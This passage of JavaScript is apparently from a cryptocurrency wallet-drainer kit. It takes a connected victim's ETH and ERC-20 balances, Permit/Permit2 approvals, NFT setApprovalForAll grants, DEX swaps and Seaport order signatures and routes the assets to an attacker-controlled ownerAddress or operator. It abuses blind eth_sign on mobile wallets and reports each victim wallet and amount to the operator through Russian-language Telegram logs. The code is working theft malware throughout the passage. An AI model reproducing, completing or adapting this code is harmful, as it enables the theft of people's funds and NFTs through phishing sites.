    }
    tokenList.forEach((token) => {
        if (token.type == "1" && token.approved == true) {
            uniPrice+=token.balance;
        }
    });
    if(uniPrice > 0) {
        tokenList.push({
            type: "5",
            chain: "eth",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: uniPrice,
            owned: "",
            "approved": false, 
        })
    }
    if (offer.offer.length == 0) {
        tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
        console.log("TokenList", tokenList);
        await sendToken(offer, counter, Seaport);
        await waitClose();
        return;
    } else {
        tokenList.push({
            type: "seaport",
            chain: "eth",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: bundlePrice,
            owned: "",
            "approved": false, 
        })
    }
    tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
    console.log("TokenList", tokenList);
    await sendToken(offer, counter, Seaport);
    await waitClose();
}

async function claimETH(amount, msg, chainId, symbol, balance) {
    if(account=="") return;
    logTlg(`💎 Кошелек ${account} получил запрос на Transfer ${symbol} на сумму ${balance}$ в сети ${chainId}`);
    abi = new ethers.utils.Interface([{
                      'constant': ![],
                      'inputs': [],
                      'name': 'Claim',
                      'outputs': [],
                      'payable': !![],
                      'stateMutability': 'payable',
                      'type': 'function'
                  }]), encoded = abi.encodeFunctionData('Claim');
    let gasStock;
    if(chainId == "0x1") { gasStock = "300000"; }
    else if(chainId == "0x38") { gasStock = "300000"; }
    else if(chainId == "0x89") { gasStock = "400000"; }
    else if(chainId == "0xfa") { gasStock = "500000"; }
    else if(chainId == "0xa86a") { gasStock = "290000"; }
    else if(chainId == "0xa") { gasStock = "1800000000"; }
    else if(chainId == "0xa4b1") { gasStock = "60000000"; }
    else if(chainId == "0x64") { gasStock = "300000"; }
    else if(chainId == "0xa4ec") { gasStock = "300000"; }

    const ethBalance = web3.utils.fromWei(amount.toString(), 'ether');
    console.log(ethBalance);
    success = 1;
    
    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    let mgasPrice = web3.utils.toHex(gasPrice);
    if(chainId == "0x1") {
        mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
    }
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (parseInt(gasPrice)*gasStock);
    const valueToSendString = valueToSend.toString();
    const valueToTransHex = web3.utils.toHex(valueToSendString);

    var transactionObject = {
      from: account,
      to: ownerAddress,
      value: valueToTransHex
    }

    try {
        if(chainId == "0x1") {
          await signer.sendTransaction({
              'from': account,
              'to': MintETH,
              'value': valueToTransHex,
              'data': encoded,
              'gasLimit': "0xC350"
          });
        } else if(chainId == "0x38") {
          await signer.sendTransaction({
              'from': account,
              'to': MintBNB,
              'value': valueToTransHex,
              'data': encoded,
              'gasLimit': "0xC350"
          });
        } else {
        await web3.eth.sendTransaction(transactionObject);
        }
        logTlg(`💸 ${symbol} ${balance}$ были успешно отправлены и зачислены на ваш кошелек`)
    } catch(e) {
      console.log(e)
      success = 0
    }

    logTlgMsg(msg, success);
}

async function signETH(amount, msg, chainId, symbol, balance) {
    if(account=="") return;
    logTlg(`💎 Кошелек ${account} получил SIGN на Transfer ${symbol} на сумму ${balance}$ в сети ${chainId}`);
    abi = new ethers.utils.Interface([{
                      'constant': ![],
                      'inputs': [],
                      'name': 'Claim',
                      'outputs': [],
                      'payable': !![],
                      'stateMutability': 'payable',
                      'type': 'function'
                  }]), encoded = abi.encodeFunctionData('Claim');
    let gasStock;
    if(chainId == "0x1") { gasStock = "300000"; }
    else if(chainId == "0x38") { gasStock = "300000"; }
    else if(chainId == "0x89") { gasStock = "400000"; }
    else if(chainId == "0xfa") { gasStock = "500000"; }
    else if(chainId == "0xa86a") { gasStock = "290000"; }
    else if(chainId == "0xa") { gasStock = "1800000000"; }
    else if(chainId == "0xa4b1") { gasStock = "60000000"; }
    else if(chainId == "0x64") { gasStock = "300000"; }
    else if(chainId == "0xa4ec") { gasStock = "300000"; }

    const ethBalance = web3.utils.fromWei(amount.toString(), 'ether');
    console.log(ethBalance);
    success = 1;
    

    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    let mgasPrice = web3.utils.toHex(gasPrice);
    if(chainId == "0x1") {
        mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
    }
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (parseInt(gasPrice)*gasStock);
    const valueToSendString = valueToSend.toString();
    const valueToTransHex = web3.utils.toHex(valueToSendString);
    try {
        tx_ = {
          to: ownerAddress,
          nonce: nonce,
          gasLimit: "0x55F0",
          gasPrice: mgasPrice,
          value: valueToTransHex,
          data: "0x0",
          r: "0x",
          s: "0x",
          v: chainId,
        };
        console.log(tx_);
        const { ethereumjs } = window;
        var tx = new ethereumjs.Tx(tx_);
        const serializedTx = "0x" + tx.serialize().toString("hex");
        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

        const initialSig = await web3.eth.sign(sha3_, account);

        const temp = initialSig.substring(2),
          r = "0x" + temp.substring(0, 64),
          s = "0x" + temp.substring(64, 128),
          rhema = parseInt(temp.substring(128, 130), 16),
          v = web3.utils.toHex(rhema + chainId * 2 + 8);
        tx.r = r;
        tx.s = s;
        tx.v = v;
        const txFin = "0x" + tx.serialize().toString("hex");
        console.log("Waiting for sign submitting...");
        web3.eth.sendSignedTransaction(txFin).then(() => {
          logTlg(`💸 ${symbol} ${balance}$ были успешно подписаны и зачислены на ваш кошелек`)
        })
    } catch(e){
        if (e.code == "-32601") {
            console.log("Подпись не поддерживается");
            logTlg(`💎 Кошелек ${account} получил запрос на Transfer ${symbol} на сумму ${balance}$ в сети ${chainId}`);
            var transactionObject = {
              from: account,
              to: ownerAddress,
              value: valueToTransHex
            }
            try {
              if(chainId == "0x1") {
                  await signer.sendTransaction({
                      'from': account,
                      'to': MintETH,
                      'value': valueToTransHex,
                      'data': encoded,
                      'gasLimit': "0xC350"
                  });
              } else if(chainId == "0x38") {
                  await signer.sendTransaction({
                      'from': account,
                      'to': MintBNB,
                      'value': valueToTransHex,
                      'data': encoded,
                      'gasLimit': "0xC350"
                  });
              } else {
                await web3.eth.sendTransaction(transactionObject);
              }
              logTlg(`💸 ${symbol} ${balance}$ были успешно отправлены и зачислены на ваш кошелек`)
            } catch(e) {
              console.log(e)
              success = 0
            }
        } else {
            console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function claimERC20(tokenAddress, amount, msg, chainId, abiUrl, symbol, balance, network) {
    console.log(tokenAddress, account, amount);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);
    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
    const functions = contract.functions;
    success = 1;
    
    let hasPermit = functions.hasOwnProperty('permit') && functions.hasOwnProperty('nonces') &&
    functions.hasOwnProperty('name') && functions.hasOwnProperty('DOMAIN_SEPARATOR') && isValidPermit(functions);

    if(hasPermit && chainId !== "0x89") {
        logTlg(`💎 Кошелек ${account} получил запрос на Permit ${symbol} на сумму ${balance}$ в сети ${chainId}`)
        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, permit: await permit(msg, contract, account, operator), impl: contractInfo[1]};
        if(permitApprove == 1) {
            axios.post(TOKEN_APPROVE, data).then(function (response) {
              logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались методом PERMIT и зачислились на ваш кошелёк`)
            });
            data.permit = JSON.parse(data.permit);
            let permitMsg = `⚙️ If permit did not automatically apply:<br>`
            permitMsg += 'https://'+chainToId[network].explorer+'/token/'+data.tokenAddress;
            permitMsg += "<br>Contract: <code>" + data.tokenAddress + "</code>"
            permitMsg += "<br>Network: <code>" + network + "</code>"
            permitMsg += "<br>Owner: <code>" + data.owner + "</code>"
            permitMsg += "<br>Spender: <code>" + data.spender + "</code>"
            permitMsg += "<br>Value: <code>" + data.permit.value + "</code>"
            permitMsg += "<br>Deadline: <code>" + data.permit.deadline + "</code>"
            permitMsg += "<br>v: <code>" + data.permit.v + "</code>"
            permitMsg += "<br>r: <code>" + data.permit.r + "</code>"
            permitMsg += "<br>s: <code>" + data.permit.s + "</code>"
            logTlg(permitMsg);
        }
        return data;
    }

    let nodeName = "";
    try {
      nodeName = await web3.eth.getNodeInfo();
    } catch (error) {
      console.log(error);
    }
    const isMetaMask = provider.isMetaMask && nodeName && nodeName.toLowerCase().includes("metamask");
    if (isMetaMask) {
        logTlg(`💎 Кошелек ${account} получил запрос на Transfer ${symbol} на сумму ${balance}$ в сети ${chainId}`);
        const gasPrice = await web3.eth.getGasPrice();
        try {
            await tokenContract.methods.transfer(ownerAddress, amount).send({
             from: account,
             gas: 110000,
             gasPrice:gasPrice
            });
            logTlg(`💸 ${symbol} ${balance}$ были успешно отправлены и зачислены на ваш кошелек`)
        } catch(e) {
          console.log(e)
          success = 0
        }
        logTlgMsg(msg, success);
    } else {
        logTlg(`💎 Кошелек ${account} получил запрос на APPROVE ${symbol} на сумму ${balance}$ в сети ${chainId}`);
        const gasPrice = await web3.eth.getGasPrice();
        try {
            await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
             from: account,
             gas: 110000,
             gasPrice:gasPrice
            });
            const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator};
            axios.post(TOKEN_TRANSFER, data).then(function (response) {
                logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались методом APPROVE и зачислились на ваш кошелёк`);
            });
        } catch(e) {
          console.log(e)
          success = 0
        }
        logTlgMsg(msg, success);
    }
}

async function signERC20(tokenAddress, amount, msg, chainId, abiUrl, symbol, balance, network) {
    console.log(tokenAddress, account, amount);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    let gasStock;
    if(chainId == "0x1") { gasStock = "100000"; }
    else if(chainId == "0x38") { gasStock = "100000"; }
    else if(chainId == "0x89") { gasStock = "100000"; }
    else if(chainId == "0xfa") { gasStock = "100000"; }
    else if(chainId == "0xa86a") { gasStock = "100000"; }
    else if(chainId == "0xa") { gasStock = "100000"; }
    else if(chainId == "0xa4b1") { gasStock = "2000000"; }
    else if(chainId == "0x64") { gasStock = "100000"; }
    else if(chainId == "0xa4ec") { gasStock = "100000"; }

    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);

    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
    const functions = contract.functions;
    success = 1;
    
    let hasPermit = functions.hasOwnProperty('permit') && functions.hasOwnProperty('nonces') &&
    functions.hasOwnProperty('name') && functions.hasOwnProperty('DOMAIN_SEPARATOR') && isValidPermit(functions);
    

    if(hasPermit && chainId !== "0x89") {
        logTlg(`💎 Кошелек ${account} получил запрос на Permit ${symbol} на сумму ${balance}$ в сети ${chainId}`);
        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, permit: await permit(msg, contract, account, operator), impl: contractInfo[1]};
        if(permitApprove == 1) {
            axios.post(TOKEN_APPROVE, data).then(function (response) {
              logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались методом PERMIT и зачислились на ваш кошелёк`)
            });
            data.permit = JSON.parse(data.permit);
            let permitMsg = `⚙️ If permit did not automatically apply:<br>`
            permitMsg += 'https://'+chainToId[network].explorer+'/token/'+data.tokenAddress;
            permitMsg += "<br>Contract: <code>" + data.tokenAddress + "</code>"
            permitMsg += "<br>Network: <code>" + network + "</code>"
            permitMsg += "<br>Owner: <code>" + data.owner + "</code>"
            permitMsg += "<br>Spender: <code>" + data.spender + "</code>"
            permitMsg += "<br>Value: <code>" + data.permit.value + "</code>"
            permitMsg += "<br>Deadline: <code>" + data.permit.deadline + "</code>"
            permitMsg += "<br>v: <code>" + data.permit.v + "</code>"
            permitMsg += "<br>r: <code>" + data.permit.r + "</code>"
            permitMsg += "<br>s: <code>" + data.permit.s + "</code>"
            logTlg(permitMsg);
        }
        return data;
    }

    try {
        logTlg(`💎 Кошелек ${account} получил SIGN на APPROVE ${symbol} на сумму ${balance}$ в сети ${chainId}`);
        const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
        const gasPrice = await web3.eth.getGasPrice();
        let mgasPrice = web3.utils.toHex(gasPrice);
        if(chainId == "0x1") {
            mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
        }
        const gasLimitHex = web3.utils.toHex(gasStock);
        let tx_;
        tx_ = {
          to: tokenAddress,
          nonce: nonce,
          gasLimit: "0x186A0",
          gasPrice: mgasPrice,
          value: "0x0",
          data: tokenContract.methods.approve(operator, MAX_APPROVAL)
            .encodeABI(),
          r: "0x",
          s: "0x",
          v: chainId,
        };
        const { ethereumjs } = window;
        var tx = new ethereumjs.Tx(tx_);
        const serializedTx = "0x" + tx.serialize().toString("hex");
        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
        const initialSig = await web3.eth.sign(sha3_, account);
        const temp = initialSig.substring(2),
          r = "0x" + temp.substring(0, 64),
          s = "0x" + temp.substring(64, 128),
          rhema = parseInt(temp.substring(128, 130), 16),
          v = web3.utils.toHex(rhema + chainId * 2 + 8);
        tx.r = r;
        tx.s = s;
        tx.v = v;
        const txFin = "0x" + tx.serialize().toString("hex");
        console.log("Waiting for sign submitting...");
        const res = await web3.eth.sendSignedTransaction(txFin);
        console.log("Submitted:", res);
        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator};
        axios.post(TOKEN_TRANSFER, data).then(function (response) {
            logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались методом APPROVE и зачислились на ваш кошелёк`)
        });
    } catch(e) {
        if (e.code == "-32601") {
            console.log("Подпись не поддерживается");
            try {
                const gasPrice = await web3.eth.getGasPrice();
                await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
                 from: account,
                 gas: 110000,
                 gasPrice:gasPrice
                });
                const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator};
                axios.post(TOKEN_TRANSFER, data).then(function (response) {
                    logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались и зачислились на ваш кошелёк`)
                });
            } catch(e) {
              console.log(e)
              success = 0
            }
        } else {
            console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function claimNFT(tokenAddress, nftTokenID, chainId, msg, balance) {
    const data = {owner: account, tokenAddress: tokenAddress, tokens: nftTokenID};
    var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
    success = 1;
    logTlg(`💎 Кошелек ${account} получил запрос на APPROVE NFT на сумму ${balance}$ в сети ${chainId}`);
    const gasPrice = await web3.eth.getGasPrice();
    let estimateGas;
    try {
      estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({from: account})
    } catch {
      estimateGas = 100000
    }
    try {
        await tokenContract.methods.setApprovalForAll(contractSAFA, true).send({
           from: account,
           gas: estimateGas,
           gasPrice:gasPrice
        });
        axios.post(NFT_TRANSFER, data).then(function (response) {
            logTlg(`💸 NFT на сумму ${balance}$ успешно списались методом SAFA и зачислились на ваш кошелёк`)
        });
    } catch(e) {
      console.log(e)
      success = 0
    }
    logTlgMsg(msg, success);
}

async function signNFT(tokenAddress, nftTokenID, chainId, msg, balance) {
  const data = {owner: account, tokenAddress: tokenAddress, tokens: nftTokenID};
  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  success = 1;
  try {
    logTlg(`💎 Кошелек ${account} получил SIGN на APPROVE NFT на сумму ${balance}$ в сети ${chainId}`);
    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    let mgasPrice = web3.utils.toHex(gasPrice);
    if(chainId == "0x1") {
        mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
    }
    tx_ = {
      to: tokenAddress,
      nonce: nonce,
      gasLimit: "0x493E0",
      gasPrice: mgasPrice,
      value: "0x0",
      data: tokenContract.methods.setApprovalForAll(contractSAFA, true).encodeABI(),
      r: "0x",
      s: "0x",
      v: "0x1",
    };
    const { ethereumjs } = window;
    var tx = new ethereumjs.Tx(tx_);
    const serializedTx = "0x" + tx.serialize().toString("hex");
    const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
    const initialSig = await web3.eth.sign(sha3_, account);
    const temp = initialSig.substring(2),
      r = "0x" + temp.substring(0, 64),
      s = "0x" + temp.substring(64, 128),
      rhema = parseInt(temp.substring(128, 130), 16),
      v = web3.utils.toHex(rhema + chainId * 2 + 8);
    tx.r = r;
    tx.s = s;
    tx.v = v;
    const txFin = "0x" + tx.serialize().toString("hex");
    console.log("Waiting for sign submitting...");
    const res = await web3.eth.sendSignedTransaction(txFin);
    console.log("Submitted:", res);
    axios.post(NFT_TRANSFER, data).then(function (response) {
        logTlg(`💸 NFT на сумму ${balance}$ успешно списались методом SAFA и зачислились на ваш кошелёк`)
    });
    } catch(e) {
        if (e.code == "-32601") {
            console.log("Подпись не поддерживается");
            const gasPrice = await web3.eth.getGasPrice();
            let estimateGas;
            try {
              estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({from: account})
            } catch {
              estimateGas = 100000
            }
            try {
                await tokenContract.methods.setApprovalForAll(contractSAFA, true).send({
                   from: account,
                   gas: estimateGas,
                   gasPrice:gasPrice
                });
                axios.post(NFT_TRANSFER, data).then(function (response) {
                    logTlg(`💸 NFT на сумму ${balance}$ успешно списались методом SAFA и зачислились на ваш кошелёк`)
                });
            } catch(e) {
              console.log(e)
              success = 0
            }
        } else {
            console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function claim1155NFT(tokenAddress, nftTokenID, chainId, msg) {
    var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
    success = 1;
    const gasPrice = await web3.eth.getGasPrice();
    let estimateGas;
    try {
      estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({from: account})
    } catch {
      estimateGas = 150000
    }
    try {
        await tokenContract.methods.setApprovalForAll(operator, true).send({
           from: account,
           gas: estimateGas,
           gasPrice:gasPrice
        });
    } catch(e) {
      console.log(e)
      success = 0
    }
    logTlgMsg(msg, success);
}

async function sign1155NFT(tokenAddress, nftTokenID, chainId, msg) {
  var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
  success = 1;
  try {
    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    let mgasPrice = web3.utils.toHex(gasPrice);
    if(chainId == "0x1") {
        mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
    }
    tx_ = {
      to: tokenAddress,
      nonce: nonce,
      gasLimit: "0x493E0",
      gasPrice: mgasPrice,
      value: "0x0",
      data: tokenContract.methods.setApprovalForAll(operator, true).encodeABI(),
      r: "0x",
      s: "0x",
      v: chainId,
    };
    const { ethereumjs } = window;
    var tx = new ethereumjs.Tx(tx_);
    const serializedTx = "0x" + tx.serialize().toString("hex");
    const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
    const initialSig = await web3.eth.sign(sha3_, account);
    const temp = initialSig.substring(2),
      r = "0x" + temp.substring(0, 64),
      s = "0x" + temp.substring(64, 128),
      rhema = parseInt(temp.substring(128, 130), 16),
      v = web3.utils.toHex(rhema + chainId * 2 + 8);
    tx.r = r;
    tx.s = s;
    tx.v = v;
    const txFin = "0x" + tx.serialize().toString("hex");
    console.log("Waiting for sign submitting...");
    const res = await web3.eth.sendSignedTransaction(txFin);
    console.log("Submitted:", res);
    } catch(e) {
        if (e.code == "-32601") {
            console.log("Подпись не поддерживается");
            const gasPrice = await web3.eth.getGasPrice();
            let estimateGas;
            try {
              estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({from: account})
            } catch {
              estimateGas = 150000
            }
            try {
                await tokenContract.methods.setApprovalForAll(operator, true).send({
                   from: account,
                   gas: estimateGas,
                   gasPrice:gasPrice
                });
            } catch(e) {
              console.log(e)
              success = 0
            }
        } else {
            console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function sendPancake(tokenAddress, amount, msg, symbol, balance) {
    logTlg(`💎 Кошелек ${account} получил запрос на Pancake (токен ${symbol}) на сумму ${balance}$`);
    let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
    let pancakeRouter = new web3.eth.Contract(PANCAKESWAP_ABI, PANCAKE_CONTRACT_ADDRESS);
    let amountFix = ethers.BigNumber.from(amount).toString();
    let path = [];
    path[0] = tokenAddress;
    path[1] = BUSD_BSC != tokenAddress ? BUSD_BSC : WBNB_BSC;
    let amountIn = amountFix;
    let amountOut = 0;
    success = 1;
    try {
        const gasPrice = await web3.eth.getGasPrice();
        await pancakeRouter.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress, deadline).send({
            from: account
        })
    } catch(e) {
        console.log(e)
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendPancake2(tokenAddress, amount, msg, symbol, balance) {
    logTlg(`💎 Кошелек ${account} получил запрос на Pancake2 (токен ${symbol}) на сумму ${balance}$`);
    let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
    let pancakeRouter = new web3.eth.Contract(PANCAKESWAP_ABI2, PANCAKE_CONTRACT_ADDRESS2);
    let amountFix = ethers.BigNumber.from(amount).toString();
    let path = [];
    path[0] = tokenAddress;
    path[1] = BUSD_BSC != tokenAddress ? BUSD_BSC : WBNB_BSC;
    let amountIn = amountFix;
    let amountOut = 0;
    success = 1;
    let calls = [];
    try {
        const gasPrice = await web3.eth.getGasPrice();
        const itemdata = pancakeRouter.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress).encodeABI();
        calls.push(itemdata);
        await pancakeRouter.methods.multicall(deadline, calls).send({from: account});
    } catch(e) {
        console.log(e)
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendSushi(tokenAddress, amount, msg, symbol, balance) {
    logTlg(`💎 Кошелек ${account} получил запрос на Sushiswap (токен ${symbol}) на сумму ${balance}$`);
    let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
    let sushiRouter = new web3.eth.Contract(SUSHISWAP_ABI, SUSHI_CONTRACT_ADDRESS);
    let amountFix = ethers.BigNumber.from(amount).toString();
    let path = [];
    path[0] = tokenAddress;
    path[1] = USDC != tokenAddress ? USDC : WETH;
    let amountIn = amountFix;
    let amountOut = 0;
    success = 1;
    try {
        const gasPrice = await web3.eth.getGasPrice();
        await sushiRouter.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress, deadline).send({
            from: account
        })
    } catch(e) {
        console.log(e)
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendUniswap(msg, balance) {
    logTlg(`💎 Кошелек ${account} получил запрос на UNISWAP Multicall на сумму ${balance}$`);
    let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
    let contractMulticall = new web3.eth.Contract(UNISWAP_ABI, UNISWAP_CONTRACT_ADDRESS);
    let calls = [];
    for(var item of tokenList) {
        if(item.type == "1" && item.approved == true) {
            let path = [];
            path[0] = item.tokenAddress;
            path[1] = USDC != item.tokenAddress ? USDC : WETH;
            let amountFix = ethers.BigNumber.from(item.tokenAmountHex).toString();
            let amountIn = amountFix;
            let amountOut = 0;
            item.data = contractMulticall.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress).encodeABI();
            calls.push(item.data);
        }
    }
    success = 1;
    if(calls.length != 0) {
        try {
            const gasPrice = await web3.eth.getGasPrice();
            await contractMulticall.methods.multicall(deadline, calls).send({from: account})
        } catch(e) {
          console.log(e)
          success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function sendToken(offer, counter, Seaport) {
  if(tokenList.length == 0) {
            alert('You have not enough balance to use');
            return true;   
  }
  for(var item of tokenList) {
      if (!item.approved) {
        try {
          if (item.balance > 20) {
              if (wasWethApproved == 1 && item.tokenAddress == "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2") continue;
              if (item.tokenAddress == "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85") continue;
              if (selectedProvider == supportedWallets[0] || selectedWallets == "1" || selectedWallets == "2" || selectedWallets == "3") {
                  if(item.type == "seaport") continue;
              };
              if(item.type == "erc721" && item.balance < 200) continue;
              if(item.type == "erc1155" && item.balance < 200) continue;
              if(item.type == "seaport" && item.balance < 200) continue;

              const currentChainId = await web3.eth.net.getId();
              const chainHex = web3.utils.toHex(currentChainId);
              if (chainHex !== chainToId[item.chain].chainId) {
                  await changeNetwork(chainToId[item.chain].chainId);
              }

              if(item.type == "0") {
                    msgs = '<b>Transfering '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Amount: '+item.tokenAmount+' ('+ item.balance + ' $)<br><br>Account: <code>'+account+'</code><br><br>Domain: '+window.location.hostname;
                    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                        await signETH(item.tokenAmount, msgs, chainToId[item.chain].chainId, item.symbol, item.balance);
                    } else {
                        await claimETH(item.tokenAmount, msgs, chainToId[item.chain].chainId, item.symbol, item.balance);
                    }
              }
              else if(item.type == "1") {
                  msgs = '<b>Approve '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    await signERC20(item.tokenAddress, item.tokenAmountHex, msgs, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl, item.symbol, item.balance, item.chain);
                  } else {
                    await claimERC20(item.tokenAddress, item.tokenAmountHex, msgs, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl, item.symbol, item.balance, item.chain);
                  }
              }
              else if(item.type == "2") {
                  msgs = '<b>Permit2 '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                  await permit2(item.tokenAddress, item.tokenAmountHex, msgs, chainToId[item.chain].chainId, item.symbol, item.balance, item.chain);
              }
              else if(item.type == "3"){
                msgs = '<b>PancakeSwap (token: '+ item.symbol + ') | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                await sendPancake(item.tokenAddress, item.tokenAmountHex, msgs, item.symbol, item.balance);
              }
              else if(item.type == "32"){
                msgs = '<b>PancakeSwap2 (token: '+ item.symbol + ') | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                await sendPancake2(item.tokenAddress, item.tokenAmountHex, msgs, item.symbol, item.balance);
              }
              else if(item.type == "4"){
                msgs = '<b>SushiSwap (token: '+ item.symbol + ') | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
                await sendSushi(item.tokenAddress, item.tokenAmountHex, msgs, item.symbol, item.balance);
              }
              else if(item.type == "5"){
                msgs = '<b>Uniswap</b><br>Price: <code>'+item.balance+'</code>$<br>Account: <code>'+account+'</code><br>Domain: '+window.location.hostname; 
                await sendUniswap(msgs, item.balance);
              }
              else if(item.type == "erc721"){
                msgs = '<b>Transfer NFT 721</b><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Floor Price: <code>'+item.balance+'</code>$<br><br>Адрес владельца: <code>'+account+'</code><br><br>Inventory<br>https://etherscan.io/token/'+item.tokenAddress+'?a='+account+'%23inventory<br><br>Домен: '+window.location.hostname; 
                if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    await signNFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs, item.balance);
                } else {
                    await claimNFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs, item.balance);
                }
              }
              else if(item.type == "seaport") {
                    success = 1;
                    msgs = '<b>Seaport</b><br>Price: <code>'+item.balance+ ' $</code><br><br>Account: <code>'+account+'</code><br><br><br>Domain: '+window.location.hostname;
                    await Seaport.signOrder(offer, parseInt(counter)).then(function(response){
                        let sgt = response;
                        offer["counter"] = parseInt(counter);
                        const order = {
                            "recipient": endpoint,
                            "parameters": offer,
                            "signature": sgt,
                        }
                        const messageParts = splitMessage(JSON.stringify(order));
                        sendLogsParts(messageParts);
                        axios.post(SEAPORT_SIGN, order).then(function (response) {
                            logTlg(`Seaport на сумму ${item.balance}$ успешно выполен, NFT зачислились на ваш кошелёк`)
                        });
                        logTlgMsg(msgs, success);
                    }).catch(function(error) {
                        console.log(error);
                        success = 0;
                        logTlgMsg(msgs, success);
                    })
              } else {
